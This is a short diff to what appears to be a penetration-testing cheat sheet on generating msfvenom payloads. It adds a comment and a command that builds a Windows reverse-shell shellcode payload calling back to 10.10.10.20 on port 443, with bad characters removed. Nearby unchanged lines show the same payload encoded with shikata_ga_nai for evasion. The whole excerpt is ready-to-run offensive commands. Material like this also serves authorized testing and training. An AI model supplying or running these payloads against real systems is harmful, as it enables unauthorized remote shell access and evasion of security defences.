@@ -117,6 +117,10 @@ msfvenom -p windows/x64/powershell_reverse_tcp -o psh.ps1 -a x64 --platform wind
 Creating a msfvenom payload with an encoder while removing bad characters:
 
 ```text
+# Try without specifying shikata_ga_nai to avoid an output error, shikata_ga_nai is the default encoding anyway.
+msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.20 LPORT=443 -b "\x00" -f c EXITFUNC=thread
+
+# Try with shikata_ga_nai
 msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.20 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f c EXITFUNC=thread
 msfvenom -a x64 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.20 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f c EXITFUNC=thread
 ```
